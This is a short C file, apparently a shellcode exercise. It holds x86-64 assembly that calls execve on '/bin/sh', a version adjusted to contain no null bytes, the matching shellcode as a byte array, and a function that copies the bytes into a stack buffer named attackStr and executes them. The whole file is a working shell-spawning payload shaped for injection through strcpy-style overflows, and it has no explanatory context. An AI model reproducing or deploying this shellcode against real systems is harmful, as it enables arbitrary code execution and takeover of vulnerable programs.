#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void foo64()
{
   __asm__(
        "xor    %rbx,%rbx   ;"
        "xor    %rdx,%rdx   ;"
        "mov    $0x68732f6e69622f2f,%rax  ;"
        "push   %rdx        ;"
        "push   %rax        ;"
        "mov    %rsp,%rdi   ;"
        "push   %rdx        ;"
        "push   %rdi        ;"
        "mov    %rsp,%rcx   ;"
        "mov    %rsp,%rsi   ;"
        "mov    $0x3b,%rax  ;"
        "syscall;"
        );
}

void foo64_fix()
{
   __asm__(
        "xor    %rbx,%rbx   ;"
        "xor    %rdx,%rdx   ;"
        "mov    $0x68732f6e69622f2f,%rax  ;"
        "push   %rdx        ;"
        "push   %rax        ;"
        "mov    %rsp,%rdi   ;"
        "push   %rdx        ;"
        "push   %rdi        ;"
        "mov    %rsp,%rcx   ;"
        "mov    %rsp,%rsi   ;"
        "lea    0x3b(%rdx),%rax ;" //"mov    $0x3b,%rax  ;"
        "syscall;"
        );
}

char shellcode[] = 
"\x48\x31\xdb"  //xor    %rbx,%rbx
"\x48\x31\xd2"  //xor    %rdx,%rdx
"\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  //movabs $0x68732f6e69622f2f,%rax
"\x52"          //push   %rdx
"\x50"          //push   %rax
"\x48\x89\xe7"  //mov    %rsp,%rdi
"\x52"          //push   %rdx
"\x57"          //push   %rdi
"\x48\x89\xe1"  //mov    %rsp,%rcx
"\x48\x89\xe6"  //mov    %rsp,%rsi
"\x67\x48\x8d\x42\x3b"  //lea    0x3b(%edx),%rax
"\x0f\x05";             //syscall 

void foo64_fix_opcode()
{
    char attackStr[512];
    strcpy(attackStr, shellcode);
    ((void (*)())attackStr)();
}

int main(int argc, char * argv[])
{
    foo64_fix();
    return 0;
}

